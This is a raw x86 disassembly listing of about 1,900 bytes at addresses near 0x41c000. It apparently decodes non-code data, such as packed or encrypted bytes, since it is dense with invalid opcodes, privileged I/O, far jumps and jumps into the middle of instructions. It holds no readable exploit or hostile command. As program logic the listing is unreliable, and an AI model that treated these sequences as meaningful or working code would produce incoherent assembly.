  41c137:	(bad)  
  41c138:	rol    BYTE PTR [edi-0x11],1
  41c13b:	push   ebp
  41c13c:	cmc    
  41c13d:	jne    0x41c132
  41c13f:	retf   
  41c140:	dec    esi
  41c141:	adc    bl,BYTE PTR [edx]
  41c143:	call   0xda557176
  41c148:	jecxz  0x41c120
  41c14a:	jbe    0x41c10f
  41c14c:	aam    0x49
  41c14e:	or     cl,BYTE PTR [ecx-0xc]
  41c151:	daa    
  41c152:	xor    al,BYTE PTR [edi+edx*2-0x22]
  41c156:	into   
  41c157:	lds    ebp,FWORD PTR [edx+esi*4]
  41c15a:	inc    eax
  41c15b:	(bad)
  41c15e:	dec    esp
  41c15f:	in     eax,dx
  41c160:	ss mov ebp,0xcc5150b5
  41c166:	pop    eax
  41c167:	push   edi
  41c168:	leave  
  41c169:	fild   QWORD PTR [edi-0x71017f35]
  41c16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c170:	test   DWORD PTR [ecx-0x1d57db01],ecx
  41c176:	mov    eax,0xae92f92a
  41c17b:	rcl    BYTE PTR [ecx],1
  41c17d:	ja     0x41c17f
  41c17f:	cmp    BYTE PTR [esi-0x4a],ch
  41c182:	out    dx,ax
  41c184:	adc    ebx,eax
  41c186:	xor    cl,ah
  41c188:	jae    0x41c14b
  41c18a:	(bad)  
  41c18c:	jmp    0x6e60:0xfd4a7dc9
  41c193:	stos   BYTE PTR es:[edi],al
  41c194:	lds    edi,FWORD PTR cs:[edi-0x9c09317]
  41c19b:	gs push es
  41c19d:	test   eax,0x38440e92
  41c1a2:	sbb    dh,cl
  41c1a4:	push   cs
  41c1a5:	test   al,0xd5
  41c1a7:	cld    
  41c1a8:	sub    eax,0x7c6fcaa2
  41c1ad:	enter  0xe64e,0x41
  41c1b1:	adc    edi,esp
  41c1b3:	retf   
  41c1b4:	inc    ebp
  41c1b5:	ss call 0xdadc96b4
  41c1bb:	adc    BYTE PTR [eax+0x40],dh
  41c1be:	ret    0xbbde
  41c1c1:	call   0xf284619
  41c1c6:	ins    BYTE PTR es:[edi],dx
  41c1c7:	test   al,0xea
  41c1c9:	test   BYTE PTR [esp+ecx*8-0x514dbe27],ch
  41c1d0:	fcomi  st,st(6)
  41c1d2:	push   ss
  41c1d3:	dec    dx
  41c1d5:	repz inc edi
  41c1d7:	mov    esi,?
  41c1d9:	lds    esi,FWORD PTR [ecx+0x27cdeac8]
  41c1df:	test   eax,0x34d527ee
  41c1e4:	ss pusha 
  41c1e6:	in     al,dx
  41c1e7:	push   esi
  41c1e8:	mov    esi,0x2ed0aeec
  41c1ed:	jo     0x41c1d6
  41c1ef:	xor    al,0xf2
  41c1f1:	arpl   WORD PTR [ecx],bp
  41c1f3:	int3   
  41c1f4:	retf   
  41c1f5:	pop    esi
  41c1f6:	cmp    DWORD PTR [ebx+0x6a],eax
  41c1f9:	push   edi
  41c1fa:	or     BYTE PTR [edx-0x1aabd259],0x28
  41c201:	jecxz  0x41c1a7
  41c203:	jne    0x41c216
  41c205:	std    
  41c206:	jnp    0x41c1f5
  41c208:	jo     0x41c200
  41c20a:	adc    edi,edx
  41c20c:	dec    ecx
  41c20d:	push   es
  41c20e:	mov    ebx,0xdd157489
  41c213:	jecxz  0x41c263
  41c215:	stos   DWORD PTR es:[edi],eax
  41c216:	cmp    eax,0xaaeb5c34
  41c21b:	add    BYTE PTR [edi],dh
  41c21d:	jl     0x41c286
  41c21f:	lock ret 0x235f
  41c223:	xor    BYTE PTR [ecx-0x2c1b8770],0x2b
  41c22a:	mov    ds:0x4592663b,al
  41c22f:	test   BYTE PTR [edx+ebp*2],0xc9
  41c233:	xor    esi,DWORD PTR [ecx]
  41c235:	retf   
  41c236:	jns    0x41c1eb
  41c238:	dec    edi
  41c239:	or     bh,BYTE PTR [edx-0x12e9fe39]
  41c23f:	xor    bh,BYTE PTR [ecx+0x2d]
  41c242:	push   ecx
  41c243:	xchg   ebx,eax
  41c244:	popa   
  41c245:	out    0x88,eax
  41c247:	(bad)  
  41c248:	pop    ecx
  41c249:	mov    BYTE PTR [edx-0x43],al
  41c24c:	mov    ds:0x7b10d091,al
  41c251:	outs   dx,BYTE PTR ds:[esi]
  41c252:	pop    edx
  41c253:	mov    DWORD PTR [ebp-0x182c87af],ebx
  41c259:	arpl   WORD PTR [ebx-0x38],dx
  41c25c:	xchg   ecx,eax
  41c25d:	out    0x45,eax
  41c25f:	test   BYTE PTR [esi+eiz*4-0x1a],0xfb
  41c264:	cli    
  41c265:	fidiv  WORD PTR gs:[esi-0xd]
  41c269:	adc    BYTE PTR [ecx-0x57183060],ah
  41c26f:	or     esp,ecx
  41c271:	in     eax,0xcc
  41c273:	fwait
  41c274:	mov    dl,0x43
  41c276:	mov    esi,0xe6d90959
  41c27b:	sub    DWORD PTR [esi-0xf],esi
  41c27e:	jo     0x41c205
  41c280:	mov    es,WORD PTR [ebp+0x64]
  41c283:	ja     0x41c254
  41c285:	imul   BYTE PTR gs:[esi+0x26]
  41c289:	jbe    0x41c2fe
  41c28b:	pop    edx
  41c28c:	inc    ebp
  41c28d:	xor    BYTE PTR [eax+ebx*1+0x29a38ab2],dh
  41c294:	push   esp
  41c295:	or     al,0x29
  41c297:	je     0x41c2be
  41c299:	inc    esp
  41c29a:	push   edx
  41c29b:	ja     0x41c2ee
  41c29d:	jmp    0x7482:0xdefcd399
  41c2a4:	(bad)  
  41c2a6:	sti    
  41c2a7:	test   DWORD PTR [edi+0x20],0x70f0f156
  41c2ae:	rol    BYTE PTR [ebx-0x20],0xd
  41c2b2:	or     ch,BYTE PTR [edx+ecx*8-0x66]
  41c2b6:	push   ss
  41c2b7:	test   eax,0x56968c2d
  41c2bc:	fwait
  41c2bd:	inc    edx
  41c2be:	jnp    0x41c28c
  41c2c0:	and    WORD PTR [ebx-0x7418e29d],di
  41c2c7:	outs   dx,DWORD PTR ds:[esi]
  41c2c8:	adc    bl,0xbc
  41c2cb:	inc    esp
  41c2cc:	push   cs
  41c2cd:	popa   
  41c2ce:	mov    cl,0xcc
  41c2d0:	mov    edi,0xada6c46e
  41c2d5:	adc    bh,cl
  41c2d7:	mov    al,0x95
  41c2d9:	jecxz  0x41c342
  41c2db:	test   edx,0xe674bd1
  41c2e1:	les    edx,FWORD PTR [edi]
  41c2e3:	test   DWORD PTR [esi+0x1d],0xbaae4534
  41c2ea:	or     DWORD PTR [edi-0xd751a48],0xb0099126
  41c2f4:	pop    ecx
  41c2f5:	mov    DWORD PTR [ebp+0x36],edx
  41c2f8:	mov    esi,0x65cf8487
  41c2fd:	dec    ebx
  41c2fe:	pop    esi
  41c2ff:	pop    edi
  41c300:	dec    ebp
  41c301:	scas   al,BYTE PTR es:[edi]
  41c302:	ror    BYTE PTR [eax],0x74
  41c305:	push   cs
  41c306:	js     0x41c304
  41c308:	leave  
  41c309:	pop    es
  41c30a:	rol    BYTE PTR [edx],cl
  41c30c:	stos   BYTE PTR es:[edi],al
  41c30d:	int    0x85
  41c30f:	adc    DWORD PTR [edi-0x39],ebp
  41c312:	sub    eax,0xb00f1abc
  41c317:	leave  
  41c318:	imul   ebp,DWORD PTR [ecx+0x21c62ffc],0xdb76355e
  41c322:	mov    ebp,0x575a722
  41c327:	fwait
  41c328:	pusha  
  41c329:	adc    BYTE PTR gs:[edi+0x586441e4],ah
  41c330:	ret    0xe37b
  41c333:	jmp    0x41c304
  41c335:	pop    esi
  41c336:	clc    
  41c337:	int    0x8f
  41c339:	push   cs
  41c33a:	fsub   st,st(0)
  41c33c:	pushf  
  41c33d:	je     0x41c36e
  41c33f:	rcl    BYTE PTR [ebp-0x49bf0fea],1
  41c345:	sub    BYTE PTR [ebx+0xf],0x3c
  41c349:	mov    bl,0x12
  41c34b:	dec    edi
  41c34c:	data16 jo 0x41c327
  41c34f:	rcr    ecx,0x25
  41c352:	xchg   DWORD PTR [esi-0x27],esp
  41c355:	xchg   edx,eax
  41c356:	ins    DWORD PTR es:[edi],dx
  41c357:	fnstsw WORD PTR [edi+0x62]
  41c35a:	addr16 cdq 
  41c35c:	xor    al,BYTE PTR [ebx-0x49]
  41c35f:	out    dx,al
  41c360:	fisubr WORD PTR [ebx+esi*4+0x3f53b7d3]
  41c367:	jbe    0x41c2f7
  41c369:	mov    ecx,0xb5d8655f
  41c36e:	into   
  41c36f:	inc    edi
  41c370:	bound  esi,QWORD PTR [eax]
  41c372:	cmp    al,BYTE PTR [edi+0x64518f15]
  41c378:	xor    eax,0xd044172
  41c37d:	jg     0x41c3a0
  41c37f:	jp     0x41c3ca
  41c381:	fcomip st,st(4)
  41c384:	inc    ebp
  41c385:	push   ebx
  41c386:	adc    eax,0x469d0733
  41c38b:	ds mov eax,0xe7802b3b
  41c391:	dec    esi
  41c392:	sti    
  41c393:	sbb    esp,DWORD PTR [eax+0x1]
  41c396:	je     0x41c33b
  41c398:	(bad)  
  41c399:	mul    DWORD PTR [ecx-0x2c38c72c]
  41c39f:	cdq    
  41c3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3a1:	pop    edi
  41c3a2:	arpl   WORD PTR [eax],ax
  41c3a4:	mov    ds:0xeb9f8a0a,eax
  41c3a9:	int    0x80
  41c3ab:	clc    
  41c3ac:	push   cs
  41c3ad:	mov    ah,0x73
  41c3af:	popf   
  41c3b0:	jne    0x41c425
  41c3b2:	dec    edi
  41c3b3:	(bad)  [esi+0x65]
  41c3b6:	cvttps2pi mm6,xmm0
  41c3b9:	xor    dl,BYTE PTR [ebx-0x55]
  41c3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3bd:	jo     0x41c358
  41c3bf:	add    esp,esp
  41c3c1:	sbb    al,0x45
  41c3c3:	lea    eax,[ebx]
  41c3c5:	jge    0x41c38b
  41c3c7:	fist   WORD PTR [ecx+0x400bcfea]
  41c3cd:	imul   DWORD PTR [edi]
  41c3cf:	fmulp  st(0),st
  41c3d1:	or     al,0x32
  41c3d3:	mov    dl,0x9d
  41c3d5:	fsubr  DWORD PTR [edi+0x5e34289f]
  41c3db:	pop    es
  41c3dc:	jns    0x41c379
  41c3de:	and    BYTE PTR [ebx],bh
  41c3e0:	jb     0x41c3bd
  41c3e2:	jle    0x41c393
  41c3e4:	imul   ecx,ecx,0xffffffc0
  41c3e7:	and    esp,esp
  41c3e9:	add    eax,0xc10da173
  41c3ee:	(bad)
  41c3f2:	pop    ds
  41c3f3:	popf   
  41c3f4:	cli    
  41c3f5:	or     eax,0x5f01eb19
  41c3fa:	dec    ebx
  41c3fb:	xor    al,0x7d
  41c3fd:	es stos DWORD PTR es:[edi],eax
  41c3ff:	lods   al,BYTE PTR ds:[esi]
  41c400:	imul   ebx
  41c402:	push   edi
  41c403:	(bad)  
  41c404:	dec    bx
  41c406:	lock push cs
  41c408:	jge    0x41c3f2
  41c40a:	lods   al,BYTE PTR ds:[esi]
  41c40b:	call   0x7d74:0xe656eebd
  41c412:	mov    edx,0x1bf1753
  41c417:	adc    al,0x9f
  41c419:	fdivr  DWORD PTR [ebx]
  41c41b:	aas    
  41c41c:	pop    eax
  41c41d:	jo     0x41c45c
  41c41f:	cmp    esp,esp
  41c421:	sti    
  41c422:	mov    esp,0x80671804
  41c427:	mov    edi,0x25d03fcd
  41c42c:	inc    edx
  41c42d:	and    dl,dl
  41c42f:	mov    eax,0x8296552b
  41c434:	dec    eax
  41c435:	mov    cl,0x7f
  41c437:	daa    
  41c438:	push   eax
  41c439:	int3   
  41c43a:	sbb    BYTE PTR [esi+0x3d],bl
  41c43d:	add    eax,0xc66a615
  41c442:	fadd   st(3),st
  41c444:	jp     0x41c440
  41c446:	jbe    0x41c46c
  41c448:	outs   dx,DWORD PTR ds:[esi]
  41c449:	inc    ebp
  41c44a:	mov    ch,0xf
  41c44c:	add    bh,BYTE PTR [edi+0x61]
  41c44f:	aam    0x6d
  41c451:	fdecstp 
  41c453:	dec    DWORD PTR [ecx+ebp*8+0x7c7b1acb]
  41c45a:	out    0x13,al
  41c45c:	aad    0xd5
  41c45e:	lock mov dl,0xcb
  41c461:	inc    edx
  41c462:	mov    ds:0x970d6c61,eax
  41c467:	test   edx,esp
  41c469:	mov    ds:0xbe1bd692,eax
  41c46e:	adc    al,0xce
  41c470:	(bad)  
  41c471:	shl    DWORD PTR [edx-0x6e],cl
  41c474:	std    
  41c475:	clc    
  41c476:	imul   DWORD PTR [esi]
  41c478:	sub    dl,BYTE PTR [esi]
  41c47a:	(bad)  
  41c47d:	fdiv   QWORD PTR [ebx+0x4c68bdb0]
  41c483:	sub    ch,cl
  41c485:	jnp    0x6648736b
  41c48b:	sub    BYTE PTR [esi+edx*4],bl
  41c48e:	xor    eax,0xa5d9b26e
  41c493:	stc    
  41c494:	ret    
  41c495:	stos   DWORD PTR es:[edi],eax
  41c496:	mov    ebx,0x8a9b4382
  41c49b:	xchg   ecx,eax
  41c49c:	(bad)  
  41c49d:	cmp    DWORD PTR [esi],ebx
  41c49f:	das    
  41c4a0:	mov    ah,0x24
  41c4a2:	test   eax,0xb9e399ef
  41c4a7:	jp     0x41c486
  41c4a9:	dec    ebp
  41c4aa:	sbb    al,0x1f
  41c4ac:	xchg   edi,eax
  41c4ad:	mov    al,0xcc
  41c4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4b0:	sbb    DWORD PTR [esi+0x2],esi
  41c4b3:	mov    ah,0x1c
  41c4b5:	outs   dx,DWORD PTR ds:[esi]
  41c4b6:	push   edx
  41c4b7:	test   BYTE PTR ds:0x2196ea7c,dl
  41c4bd:	int    0xf1
  41c4bf:	push   ds
  41c4c0:	(bad)  
  41c4c3:	cli    
  41c4c4:	ss mov cl,0x5e
  41c4c7:	mov    ds:0x5b0ddc7b,eax
  41c4cc:	xor    eax,0x53e3b2ef
  41c4d1:	pop    ss
  41c4d2:	or     eax,0x560a9795
  41c4d7:	and    eax,0xacfa4902
  41c4dc:	mov    ch,0x36
  41c4de:	sub    ecx,DWORD PTR [esi+0x2e]
  41c4e1:	not    DWORD PTR ds:0x4fbb47df
  41c4e7:	test   DWORD PTR [edx+ebx*2],0x6f84f325
  41c4ee:	mov    dl,0x28
  41c4f0:	jbe    0x41c49a
  41c4f2:	xlat   BYTE PTR ds:[ebx]
  41c4f3:	lea    eax,[ecx-0x19]
  41c4f6:	xchg   esi,eax
  41c4f7:	retf   0x24e5
  41c4fa:	jno    0x41c575
  41c4fc:	add    eax,0x325e7dea
  41c501:	jg     0x41c50c
  41c503:	shl    bh,1
  41c505:	xchg   edx,eax
  41c506:	inc    eax
  41c507:	in     eax,dx
  41c508:	js     0x41c4af
  41c50a:	or     esp,esi
  41c50c:	dec    edx
  41c50d:	dec    esp
  41c50e:	add    eax,0x32ff9649
  41c513:	mov    ebx,0x3d93bb3
  41c518:	mov    BYTE PTR [ecx+0x46116cbf],dl
  41c51e:	scas   eax,DWORD PTR es:[edi]
  41c51f:	setbe  BYTE PTR [ecx-0x20e46d21]
  41c526:	jle    0x41c4a9
  41c528:	mov    al,0x1c
  41c52a:	stos   BYTE PTR es:[edi],al
  41c52b:	imul   eax,DWORD PTR ds:0xd66adb44,0x210699c5
  41c535:	cmp    BYTE PTR [ebx],0x5
  41c538:	dec    ecx
  41c539:	fnsave [edx-0x3a]
  41c53c:	mov    esi,0x2a90add7
  41c541:	mov    eax,ds:0xf0598931
  41c546:	dec    esi
  41c547:	retf   0x5405
  41c54a:	pop    es
  41c54b:	or     al,BYTE PTR [ecx+0x60]
  41c54e:	sbb    edi,DWORD PTR [eax]
  41c550:	test   al,0xae
  41c552:	mov    esi,0xaf93645c
  41c557:	mov    cl,0x48
  41c559:	icebp  
  41c55a:	mov    BYTE PTR [edx-0x4f9314fb],0xa7
  41c561:	in     eax,dx
  41c562:	jb     0x41c53c
  41c564:	ret    0x3125
  41c567:	fnsave [ebx]
  41c569:	pusha  
  41c56a:	je     0x41c569
  41c56c:	aaa    
  41c56d:	xchg   edx,eax
  41c56e:	pop    eax
  41c56f:	push   ss
  41c570:	mov    al,0x13
  41c572:	xor    BYTE PTR [esi],ch
  41c574:	sbb    ebp,DWORD PTR [ecx+0x41e9a1e1]
  41c57a:	push   0xffffffb3
  41c57c:	push   esp
  41c57d:	test   DWORD PTR [eax],0xe562c34a
  41c583:	in     al,dx
  41c584:	xchg   BYTE PTR [esi],dl
  41c586:	repz (bad) 
  41c588:	push   es
  41c589:	scas   al,BYTE PTR es:[edi]
  41c58a:	xor    al,bh
  41c58c:	xchg   esp,eax
  41c58d:	push   0xffffffdf
  41c58f:	xchg   ecx,eax
  41c590:	mov    edx,ds
  41c592:	mov    esp,0x6596fdc8
  41c597:	cld    
  41c598:	fist   DWORD PTR [edi-0x42]
  41c59b:	int3   
  41c59c:	xchg   edx,eax
  41c59d:	frstor [ebx]
  41c59f:	adc    BYTE PTR [edi+0x61657279],bh
  41c5a5:	sbb    DWORD PTR [ecx+0x4e],edx
  41c5a8:	dec    esp
  41c5a9:	outs   dx,DWORD PTR ds:[esi]
  41c5aa:	cs inc ecx
  41c5ac:	mov    eax,0x55c1a913
  41c5b1:	add    edi,DWORD PTR ds:0xea228b11
  41c5b7:	xor    bl,BYTE PTR [edi+0x7a737b94]
  41c5bd:	mov    ebx,0x62028414
  41c5c2:	fs adc eax,0x5c0f8912
  41c5c8:	loop   0x41c58e
  41c5ca:	xchg   edx,eax
  41c5cb:	mov    ecx,0xd1525a7c
  41c5d0:	outs   dx,DWORD PTR ds:[esi]
  41c5d1:	into   
  41c5d2:	das    
  41c5d3:	adc    BYTE PTR [ebp+0x2b408012],0xcf
  41c5da:	outs   dx,BYTE PTR ds:[esi]
  41c5db:	fnstsw WORD PTR [ebx]
  41c5dd:	sahf   
  41c5de:	inc    esi
  41c5df:	inc    ecx
  41c5e0:	inc    esi
  41c5e1:	dec    esi
  41c5e2:	jmp    0x2e3aa0a4
  41c5e7:	inc    edi
  41c5e8:	push   ebp
  41c5e9:	and    esi,DWORD PTR [edi-0x4777e840]
  41c5ef:	sub    edi,DWORD PTR [ebx+0x7854e736]
  41c5f5:	push   ebx
  41c5f6:	push   esi
  41c5f7:	cmp    cl,BYTE PTR [edi]
  41c5f9:	fwait
  41c5fa:	jbe    0x41c5ac
  41c5fc:	dec    esp
  41c5fd:	or     BYTE PTR [edx],cl
  41c5ff:	rcr    BYTE PTR [edi+0x23e53d4],cl
  41c605:	jb     0x41c609
  41c607:	lods   eax,DWORD PTR ds:[esi]
  41c608:	call   0x1c7692de
  41c60d:	mov    edi,0xfc76e27e
  41c612:	cmp    eax,0x23276720
  41c617:	(bad)  
  41c618:	sbb    eax,0x5c31111d
  41c61d:	cmp    dh,ch
  41c61f:	fxtract 
  41c621:	xor    al,0x7b
  41c623:	test   eax,0xf4835186
  41c628:	out    dx,eax
  41c629:	lods   eax,DWORD PTR ds:[esi]
  41c62a:	cli    
  41c62b:	xor    BYTE PTR [ebp-0x1c],0x4e
  41c62f:	bswap  eax
  41c631:	inc    esi
  41c632:	push   cs
  41c633:	sub    esi,esi
  41c635:	fisttp QWORD PTR [edx+ecx*4-0x7c13a6d3]
  41c63c:	jg     0x41c6a1
  41c63e:	outs   dx,DWORD PTR ds:[esi]
  41c63f:	imul   eax,edx,0x4f5a417
  41c645:	mov    bh,0x90
  41c647:	dec    ebx
  41c648:	or     eax,0x269d89b2
  41c64d:	add    al,0xea
  41c64f:	xchg   edx,eax
  41c650:	call   0x63d0da2e
  41c655:	cwde   
  41c656:	mov    ds:0x7478c169,al
  41c65b:	add    ch,dh
  41c65d:	push   esi
  41c65e:	mov    bh,0xbc
  41c660:	jb     0x41c5f2
  41c662:	fisttp QWORD PTR [esi+eiz*8]
  41c665:	lock xchg edx,eax
  41c667:	cmp    al,0xb3
  41c669:	aaa    
  41c66a:	out    dx,al
  41c66b:	imul   edi,edx,0x17b2190c
  41c671:	jo     0x41c61f
  41c673:	fnstenv [ebp-0x5aa058b8]
  41c679:	imul   edi,DWORD PTR cs:[ebx],0xd8836e21
  41c680:	(bad)  [ebx]
  41c682:	cmp    eax,0xe96fbbce
  41c687:	or     ah,BYTE PTR ds:0xd82bbff8
  41c68d:	fnsave [ebx+0x4f8740eb]
  41c693:	add    ebp,DWORD PTR [eax+eax*8]
  41c696:	adc    bl,BYTE PTR [edx+0x4861389a]
  41c69c:	adc    esp,ebp
  41c69e:	push   ds
  41c69f:	shl    DWORD PTR [edx-0x5726ff3],1
  41c6a5:	sar    BYTE PTR [edi+0x20169f52],1
  41c6ab:	jp     0x41c66d
  41c6ad:	push   cs
  41c6ae:	push   esp
  41c6af:	mov    ds:0xf6a00ad0,eax
  41c6b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6b5:	jmp    0x41c6de
  41c6b7:	lods   al,BYTE PTR ds:[esi]
  41c6b8:	sbb    DWORD PTR [ebx+0x2e882761],0xad82070d
  41c6c2:	out    0xae,eax
  41c6c4:	jae    0x41c71c
  41c6c6:	je     0x41c6ad
  41c6c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6c9:	jmp    0xf616:0x20ddc046
  41c6d0:	call   0x67d521ab
  41c6d5:	push   es
  41c6d6:	repnz xchg edx,eax
  41c6d8:	aaa    
  41c6d9:	xor    DWORD PTR [ecx-0x12],edx
  41c6dc:	out    0x9a,al
  41c6de:	jno    0x41c68d
  41c6e0:	gs jle 0x41c753
  41c6e3:	sahf   
  41c6e4:	inc    edi
  41c6e5:	cmp    ebx,DWORD PTR [bp+si]
  41c6e8:	jbe    0x41c767
  41c6ea:	adc    al,0x88
  41c6ec:	push   0x431594dd
  41c6f1:	in     al,dx
  41c6f2:	pop    es
  41c6f3:	inc    esi
  41c6f4:	xor    DWORD PTR ss:[edx+ebx*8-0x66],0x7e1f86be
  41c6fd:	mov    ebx,0x512d6835
  41c702:	div    BYTE PTR [edx+esi*8+0x5e13fc26]
  41c709:	test   DWORD PTR [eax],esi
  41c70b:	sbb    ecx,DWORD PTR [ebx-0x4e]
  41c70e:	mov    ds:0x35597a7f,eax
  41c713:	adc    eax,0x8237e692
  41c718:	jbe    0x41c76c
  41c71a:	mov    ebp,0x53cb6544
  41c71f:	pushf  
  41c720:	adc    al,0x91
  41c722:	rcr    BYTE PTR [edi+0x7eca86a0],1
  41c728:	(bad)  
  41c729:	pop    esp
  41c72a:	test   al,0x4
  41c72c:	out    0xb1,eax
  41c72e:	xlat   BYTE PTR ds:[ebx]
  41c72f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c730:	jmp    0x41c6d8
  41c732:	clc    
  41c733:	fisttp DWORD PTR [edx-0x5f]
  41c736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c737:	iret   
  41c738:	popf   
  41c739:	lds    eax,FWORD PTR [eax-0x502f792a]
  41c73f:	fwait
  41c740:	add    BYTE PTR [eax+0x50],bl
  41c743:	sbb    edi,ebp
  41c745:	(bad)  
  41c747:	outs   dx,BYTE PTR ds:[esi]
  41c748:	inc    ebx
  41c749:	clc    
  41c74a:	dec    eax
  41c74b:	(bad)  
  41c74c:	push   ds
  41c74d:	out    dx,eax
  41c74e:	jp     0x41c76d
  41c750:	push   0xffffffa1
  41c752:	mov    al,ds:0xfd4b7018
  41c757:	in     eax,dx
  41c758:	mov    edx,0xbeec2dd9
  41c75d:	dec    ebx
  41c75e:	nop
  41c75f:	mov    edi,0xff2a2bc3
  41c764:	cmp    BYTE PTR [ebx-0x566e7d40],cl
  41c76a:	(bad)  
  41c76b:	lods   al,BYTE PTR ds:[esi]
  41c76c:	push   eax
  41c76d:	jecxz  0x41c764
  41c76f:	test   BYTE PTR [ebx-0xc],bh
  41c772:	cmp    al,0xc
  41c774:	sub    edi,DWORD PTR [ebx]
  41c776:	xor    al,0xc
  41c778:	sub    DWORD PTR [ecx+0x18],ecx
  41c77b:	neg    DWORD PTR [esi+0x3f]
  41c77e:	sub    ah,BYTE PTR [ebx+0x12ca82da]
  41c784:	xchg   edi,eax
  41c785:	or     DWORD PTR [ebx-0x14],edx
  41c788:	cdq    
  41c789:	retf   
  41c78a:	jg     0x41c7f8
  41c78c:	bound  ebp,QWORD PTR gs:[edi+0x4d]
  41c790:	data16 aaa 
  41c792:	mov    esi,0xad7961eb
  41c797:	in     eax,0x27
  41c799:	scas   al,BYTE PTR es:[edi]
  41c79a:	ss pop ebp
  41c79c:	out    0x5b,al
  41c79e:	add    DWORD PTR [eax],edx
  41c7a0:	mov    ch,0xed
  41c7a2:	loopne 0x41c791
  41c7a4:	outs   dx,BYTE PTR ds:[esi]
  41c7a5:	out    dx,eax
  41c7a6:	iret   
  41c7a7:	sbb    BYTE PTR [esi-0x341aed93],bh
  41c7ad:	loopne 0x41c7f3
  41c7af:	dec    edi
  41c7b0:	shl    DWORD PTR [esi],1
  41c7b2:	(bad)  
  41c7b3:	or     eax,edx
  41c7b5:	mov    dl,0x96
  41c7b7:	fwait
  41c7b8:	dec    esi
  41c7b9:	nop
  41c7ba:	or     edi,ebp
  41c7bc:	ret    0x7f4d
  41c7bf:	jmp    0xee80:0x41bb0ef4
  41c7c6:	mov    ch,0x8a
  41c7c8:	arpl   ax,di
  41c7ca:	fldcw  WORD PTR [eax-0x4d9812c]
  41c7d0:	xchg   esp,eax
  41c7d1:	out    dx,eax
  41c7d2:	mov    BYTE PTR [edi+0x76],0xd0
  41c7d6:	mov    ds:0x16d19f1d,eax
  41c7db:	sub    al,0xf4
  41c7dd:	daa    
  41c7de:	into   
  41c7df:	push   ebp
  41c7e0:	xor    BYTE PTR [ecx-0x2b91c695],cl
  41c7e6:	inc    ecx
  41c7e7:	test   al,0x83
  41c7e9:	add    cl,BYTE PTR [edx]
  41c7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7ec:	icebp  
  41c7ed:	adc    al,0xff
  41c7ef:	in     eax,dx
  41c7f0:	sbb    bl,0x42
  41c7f3:	outs   dx,BYTE PTR ds:[esi]
  41c7f4:	jno    0x41c7b1
  41c7f6:	cmp    ebp,DWORD PTR [esi+0x28]
  41c7f9:	and    BYTE PTR [esi],dh
  41c7fb:	test   ebx,edi
  41c7fd:	push   0x42
  41c7ff:	add    ah,bh
  41c801:	xor    BYTE PTR [edx+0xb],ah
  41c804:	std    
  41c805:	dec    ebp
  41c806:	jo     0x41c79a
  41c808:	pop    eax
  41c809:	adc    edi,DWORD PTR [ebx]
  41c80b:	or     BYTE PTR [edi],ah
  41c80d:	in     eax,dx
  41c80e:	mov    dl,0x84
  41c810:	call   0x23b4:0x7bcc3f63
  41c817:	test   DWORD PTR [edi],ebp
  41c819:	cld    
  41c81a:	mov    ah,0xfc
  41c81c:	(bad)  
  41c81d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c81e:	shl    cl,cl
  41c820:	cmp    ebx,DWORD PTR [edx+0x11cc1891]
  41c826:	call   0x14ebcab3
  41c82b:	xor    al,0x5d
  41c82d:	js     0x41c814
  41c82f:	(bad)  [eax]
  41c831:	lahf   
  41c832:	into   
  41c833:	(bad)  
  41c834:	xchg   ebp,eax
  41c835:	sbb    esi,DWORD PTR [eax]
  41c837:	sti    
  41c838:	cmp    DWORD PTR [ebp+0x50fc49bf],ecx
  41c83e:	add    ah,BYTE PTR [esi+0x42]
  41c841:	and    DWORD PTR [eax],edx
  41c843:	push   es
  41c844:	mov    edi,0x3125e572
  41c84a:	(bad)  
  41c84c:	cwde   
  41c84d:	mov    esi,0x27cbb25e
  41c852:	mov    ah,0xe2
  41c854:	push   ds
  41c855:	jmp    0x41c850
  41c857:	sti    
  41c858:	adc    al,0x22
  41c85a:	inc    edi
  41c85b:	pop    ebx
  41c85c:	sbb    edx,DWORD PTR [edx+0x31]
  41c85f:	pop    ds
  41c860:	lods   al,BYTE PTR ds:[esi]
  41c861:	jnp    0x41c8cc
  41c863:	punpckldq mm6,mm2
  41c866:	xchg   edi,esi
  41c868:	popa   
  41c869:	xchg   ebx,eax
  41c86a:	adc    BYTE PTR [esi],al
  41c86c:	dec    esi
  41c86d:	cmp    DWORD PTR [ebp-0xf],ebp
  41c870:	mov    esi,0x6bb616ec
  41c875:	pop    esi
  41c876:	mov    DWORD PTR [ebp-0xe6603cc],eax
  41c87c:	daa    
  41c87d:	jmp    0xf8aa164e
  41c882:	adc    DWORD PTR [edx],ebp
  41c884:	fnstcw WORD PTR ds:0xf31e99ed
  41c88a:	ret    
  41c88b:	adc    eax,0xd02e85d4
  41c890:	add    BYTE PTR [ecx+esi*2-0x45526ec9],bh
  41c897:	sbb    esp,DWORD PTR [ebx-0x74]
  41c89a:	push   0x69
  41c89c:	arpl   WORD PTR [ebx-0x6625fde1],cx
  41c8a2:	pop    ebx
  41c8a3:	enter  0x60ad,0xd8
  41c8a7:	or     esp,DWORD PTR ds:0x57dfbde2
  41c8ad:	mov    BYTE PTR [edi+esi*8],dl
  41c8b0:	sbb    edi,DWORD PTR [eax+0x17]
  41c8b3:	sbb    dl,dh
  41c8b5:	dec    esi
  41c8b6:	iret   
  41c8b7:	push   es
  41c8b8:	sbb    DWORD PTR [ecx],edx
  41c8ba:	inc    edx
  41c8bb:	aaa    
  41c8bc:	jmp    DWORD PTR [eax-0x71]
  41c8bf:	xor    eax,0x412eaa82
  41c8c4:	pop    es
  41c8c5:	mov    WORD PTR [ebx+0x46],fs
  41c8c8:	cs popa 
  41c8ca:	xor    al,0xdd
  41c8cc:	mov    fs,WORD PTR [ecx+0x155c1357]
  41c8d2:	and    ecx,DWORD PTR [ebx+0x6cba50f3]
  41c8d8:	aam    0x32
  41c8da:	call   0x54ebeee7
  41c8df:	inc    ecx
  41c8e0:	inc    eax
  41c8e1:	add    BYTE PTR [esi-0x6e],dh
  41c8e4:	push   ebx
